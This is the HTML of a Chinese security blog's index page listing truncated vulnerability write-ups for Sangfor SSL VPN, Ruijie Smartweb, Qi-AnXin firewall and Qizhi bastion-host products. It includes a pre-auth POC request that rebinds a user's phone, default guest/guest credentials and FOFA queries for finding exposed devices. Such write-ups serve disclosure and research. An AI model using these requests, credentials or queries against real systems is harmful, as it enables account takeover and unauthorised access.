@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/8/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-深信服/深信服 SSL VPN - Pre Auth 修改绑定手机" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20SSL%20VPN%20-%20Pre%20Auth%20%E4%BF%AE%E6%94%B9%E7%BB%91%E5%AE%9A%E6%89%8B%E6%9C%BA/" class="article-date">
+  <time datetime="2022-07-08T06:26:10.829Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="深信服-SSL-VPN-Pre-Auth-修改绑定手机"><a href="#深信服-SSL-VPN-Pre-Auth-修改绑定手机" class="headerlink" title="深信服 SSL VPN - Pre Auth 修改绑定手机"></a>深信服 SSL VPN - Pre Auth 修改绑定手机</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>老版本(M7.6.1)代码放上，看不懂的直接看 POC<br>吧；新版本的没绕成功还在审，所以不确定是不是这个</p>
+<p><img src="/resource/%E6%B7%B1%E4%BF%A1%E6%9C%8DSSLVPN-PreAuth%E4%BF%AE%E6%94%B9%E7%BB%91%E5%AE%9A%E6%89%8B%E6%9C%BA/media/rId24.png" alt="1.png"></p>
+<p><img src="/resource/%E6%B7%B1%E4%BF%A1%E6%9C%8DSSLVPN-PreAuth%E4%BF%AE%E6%94%B9%E7%BB%91%E5%AE%9A%E6%89%8B%E6%9C%BA/media/rId25.png" alt="2.png"></p>
+<p><img src="/resource/%E6%B7%B1%E4%BF%A1%E6%9C%8DSSLVPN-PreAuth%E4%BF%AE%E6%94%B9%E7%BB%91%E5%AE%9A%E6%89%8B%E6%9C%BA/media/rId26.png" alt="3.png"></p>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><pre><code>https://www.0-sec.org/por/changetelnum.csp?apiversion=1
+
+newtel=TARGET_PHONE&amp;sessReq=clusterd&amp;username=TARGET_USERNAME&amp;grpid=0&amp;sessid=0&amp;ip=127.0.0.1
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20SSL%20VPN%20-%20Pre%20Auth%20%E4%BF%AE%E6%94%B9%E7%BB%91%E5%AE%9A%E6%89%8B%E6%9C%BA/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20SSL%20VPN%20-%20Pre%20Auth%20%E4%BF%AE%E6%94%B9%E7%BB%91%E5%AE%9A%E6%89%8B%E6%9C%BA/" data-id="cl5c2r0z600qay8v104ekemiu" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-深信服/深信服 SSL VPN - Pre Auth 任意密码重置" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20SSL%20VPN%20-%20Pre%20Auth%20%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/" class="article-date">
+  <time datetime="2022-07-08T06:26:10.826Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="深信服-SSL-VPN-Pre-Auth-任意密码重置"><a href="#深信服-SSL-VPN-Pre-Auth-任意密码重置" class="headerlink" title="深信服 SSL VPN - Pre Auth 任意密码重置"></a>深信服 SSL VPN - Pre Auth 任意密码重置</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>高版本(如M7.6.8R2) 直接删除相关函数</p>
+<p>低版本(如M7.6.6R1) 升级版存在此漏洞</p>
+<p>打了 5.x-7.x 补丁的无法利用</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>差不多的逻辑</p>
+<p><img src="/resource/%E6%B7%B1%E4%BF%A1%E6%9C%8DSSLVPN-PreAuth%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/media/rId25.png" alt="1.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20SSL%20VPN%20-%20Pre%20Auth%20%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20SSL%20VPN%20-%20Pre%20Auth%20%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/" data-id="cl5c2r0z100q9y8v19soug76p" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-锐捷/锐捷Smartweb管理系统 默认开启Guest账户漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7Smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AFGuest%E8%B4%A6%E6%88%B7%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:10.785Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="锐捷Smartweb管理系统-默认开启Guest账户漏洞-CNVD-2020-56167"><a href="#锐捷Smartweb管理系统-默认开启Guest账户漏洞-CNVD-2020-56167" class="headerlink" title="锐捷Smartweb管理系统 默认开启Guest账户漏洞 CNVD-2020-56167"></a>锐捷Smartweb管理系统 默认开启Guest账户漏洞 CNVD-2020-56167</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>锐捷Smartweb管理系统 默认开启Guest账户漏洞 ，攻击者可以通过漏洞登录后台进一步攻击</p>
+<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><blockquote>
+<p>[!NOTE]</p>
+<p>锐捷网络股份有限公司 无线smartweb管理系统</p>
+</blockquote>
+<h2 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h2><blockquote>
+<p>[!NOTE]</p>
+<p>title=”无线smartWeb–登录页面”</p>
+</blockquote>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>登录的账号密码为 <strong>guest/guest</strong></p>
+<p>![](/resource/锐捷Smartweb管理系统-默认开启Guest账户漏洞/media/1.png)</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7Smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AFGuest%E8%B4%A6%E6%88%B7%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7Smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AFGuest%E8%B4%A6%E6%88%B7%E6%BC%8F%E6%B4%9E/" data-id="cl5c2r0wr00q6y8v1ft36dak7" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-锐捷/锐捷Smartweb管理系统 密码信息泄露漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7Smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:10.782Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="锐捷Smartweb管理系统-密码信息泄露漏洞"><a href="#锐捷Smartweb管理系统-密码信息泄露漏洞" class="headerlink" title="锐捷Smartweb管理系统 密码信息泄露漏洞"></a>锐捷Smartweb管理系统 密码信息泄露漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>锐捷网络股份有限公司无线smartweb管理系统存在逻辑缺陷漏洞，攻击者可从漏洞获取到管理员账号密码，从而以管理员权限登录。</p>
+<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><blockquote>
+<p>[!NOTE]</p>
+<p>锐捷网络股份有限公司 无线smartweb管理系统</p>
+</blockquote>
+<h2 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h2><blockquote>
+<p>[!NOTE]</p>
+<p>title=”无线smartWeb–登录页面”</p>
+</blockquote>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>登录页面如下</p>
+<p>![](/resource/锐捷Smartweb管理系统-密码信息泄露漏洞/media/1.png)</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7Smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7Smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" data-id="cl5c2r0wq00q5y8v1g2764fwq" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-奇安信/奇安信 网康下一代防火墙 RCE" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E5%A5%87%E5%AE%89%E4%BF%A1/%E5%A5%87%E5%AE%89%E4%BF%A1%20%E7%BD%91%E5%BA%B7%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%20RCE/" class="article-date">
+  <time datetime="2022-07-08T06:26:10.757Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="奇安信-网康下一代防火墙-RCE"><a href="#奇安信-网康下一代防火墙-RCE" class="headerlink" title="奇安信 网康下一代防火墙 RCE"></a>奇安信 网康下一代防火墙 RCE</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>奇安信 网康下一代防火墙存在远程命令执行，通过漏洞攻击者可以获取服务器权限</p>
+<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><blockquote>
+<p>[!NOTE]</p>
+<p>奇安信 网康下一代防火墙</p>
+</blockquote>
+<h2 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h2><blockquote>
+<p>[!NOTE]</p>
+<p>app=”网康科技-下一代防火墙”</p>
+</blockquote>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>登录页面如下</p>
+<p>![](/resource/奇安信-网康下一代防火墙-RCE/media/1.png)</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E5%A5%87%E5%AE%89%E4%BF%A1/%E5%A5%87%E5%AE%89%E4%BF%A1%20%E7%BD%91%E5%BA%B7%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%20RCE/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E5%A5%87%E5%AE%89%E4%BF%A1/%E5%A5%87%E5%AE%89%E4%BF%A1%20%E7%BD%91%E5%BA%B7%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%20RCE/" data-id="cl5c2r0wo00q4y8v112ig1gbk" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-齐治堡垒机/（CNVD-2019-20835）齐治堡垒机 前台远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA/%EF%BC%88CNVD-2019-20835%EF%BC%89%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%20%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:10.676Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CNVD-2019-20835）齐治堡垒机-前台远程命令执行漏洞"><a href="#（CNVD-2019-20835）齐治堡垒机-前台远程命令执行漏洞" class="headerlink" title="（CNVD-2019-20835）齐治堡垒机 前台远程命令执行漏洞"></a>（CNVD-2019-20835）齐治堡垒机 前台远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>利用条件：无需登录</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>问题出现在ha_request.php文件，第37行的exec函数，$url为用户可控的变量，可见第33和34行。目光来到第23和24行，只要node_request函数的返回值为”OK”，即可跳过fatal函数（此函数为自定义函数，作用类似PHP内置的exit函数），继续往下执行。</p>
+<h1 id="Node-request函数的定义在include-common-php文件中，见下图2。按照其原本的逻辑，其作用是请求-url，并返回其内容。根据代码逻辑，-url"><a href="#Node-request函数的定义在include-common-php文件中，见下图2。按照其原本的逻辑，其作用是请求-url，并返回其内容。根据代码逻辑，-url" class="headerlink" title="　　Node_request函数的定义在include/common.php文件中，见下图2。按照其原本的逻辑，其作用是请求$url，并返回其内容。根据代码逻辑，$url"></a>　　Node_request函数的定义在include/common.php文件中，见下图2。按照其原本的逻辑，其作用是请求$url，并返回其内容。根据代码逻辑，$url</h1><p>&quot;http://$req_ipaddr&quot;.&quot;/listener/$method.php?n=$req_node_id&amp;a=&quot;.urlencode(json_encode($args));。所以$url变量值类似于</p>
+<p><a target="_blank" rel="noopener" href="http://10.20.10.11/listener/cluster_manage.php?n=1&amp;a=%5B%22install%22%5D">http://10.20.10.11/listener/cluster_manage.php?n=1&amp;a=%5B%22install%22%5D</a>这样的字符串。</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA/%EF%BC%88CNVD-2019-20835%EF%BC%89%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%20%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA/%EF%BC%88CNVD-2019-20835%EF%BC%89%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%20%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2r0ul00q3y8v1dv9jcew0" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-齐治堡垒机/（CNVD-2019-17294）齐治堡垒机 后台命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA/%EF%BC%88CNVD-2019-17294%EF%BC%89%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:10.674Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CNVD-2019-17294）齐治堡垒机-后台命令执行漏洞"><a href="#（CNVD-2019-17294）齐治堡垒机-后台命令执行漏洞" class="headerlink" title="（CNVD-2019-17294）齐治堡垒机 后台命令执行漏洞"></a>（CNVD-2019-17294）齐治堡垒机 后台命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先，定位到/audit/data_provider.php，直接查找$_GET[‘service’]或者$_REQUEST[‘service’]都找不到。原来在文件开头包含的common.php中，已有全局配置。</p>
+<p>代码如下，不但给变量加了个前缀”req_“，还过滤掉了一些危险字符。</p>
+<p><img src="/resource/(CNVD-2019-17294)%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.jpg" alt="1.jpg"></p>
+<p>然后，搜索”<br>$req_service”定位到data_provider.php文件的第99行。可见，将$GET[‘service’]赋值到$service变量中。</p>
+<p><img src="/resource/(CNVD-2019-17294)%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId26.jpg" alt="2.jpg"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA/%EF%BC%88CNVD-2019-17294%EF%BC%89%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA/%EF%BC%88CNVD-2019-17294%EF%BC%89%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2r0uk00q2y8v10zpy5tt6" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-齐治堡垒机/（CNVD-2019-09593）齐治堡垒机 ShtermClient-2.1.1 命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA/%EF%BC%88CNVD-2019-09593%EF%BC%89%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%20ShtermClient-2.1.1%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:10.671Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CNVD-2019-09593）齐治堡垒机-ShtermClient-2-1-1-命令执行漏洞"><a href="#（CNVD-2019-09593）齐治堡垒机-ShtermClient-2-1-1-命令执行漏洞" class="headerlink" title="（CNVD-2019-09593）齐治堡垒机 ShtermClient-2.1.1 命令执行漏洞"></a>（CNVD-2019-09593）齐治堡垒机 ShtermClient-2.1.1 命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先，在安装齐治运维堡垒机客户端软件ShtermClient后，会在计算机上注册一个伪协议”shterm”。堡垒机正是通过该协议，调用本地程序打开了连接到堡垒机的通道。如下图是chrome浏览器打开链接时的提示。</p>
+<p><img src="/resource/(CNVD-2019-09593)%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BAShtermClient-2.1.1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png" alt="1.png"></p>
+<p>我们可以在注册表中找到它，Command子项指明了如何处理shterm协议的URI。</p>
+<p><img src="/resource/(CNVD-2019-09593)%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BAShtermClient-2.1.1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId26.png" alt="2.png"></p>
+<p>通过对该过程的抓包分析，发现将”app”:”mstsc”改为”app”:”calc”，生成的shterm<br>URI即可打开本地的计算器。一度认为命令只能注入app参数，后来使用Procmon.exe监控LoadShell.exe的执行，发现会在%tmp%目录下生成一些日志文件，通过分析日志文件以及多次测试，得到了最终可行的利用方案。</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA/%EF%BC%88CNVD-2019-09593%EF%BC%89%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%20ShtermClient-2.1.1%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA/%EF%BC%88CNVD-2019-09593%EF%BC%89%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%20ShtermClient-2.1.1%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2r0uj00q1y8v1e873dqk5" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-齐治堡垒机/齐治堡垒机 任意用户登录漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:10.668Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="齐治堡垒机-任意用户登录漏洞"><a href="#齐治堡垒机-任意用户登录漏洞" class="headerlink" title="齐治堡垒机 任意用户登录漏洞"></a>齐治堡垒机 任意用户登录漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>齐治堡垒机 存在任意用户登录漏洞，访问特定的Url即可获得后台权限</p>
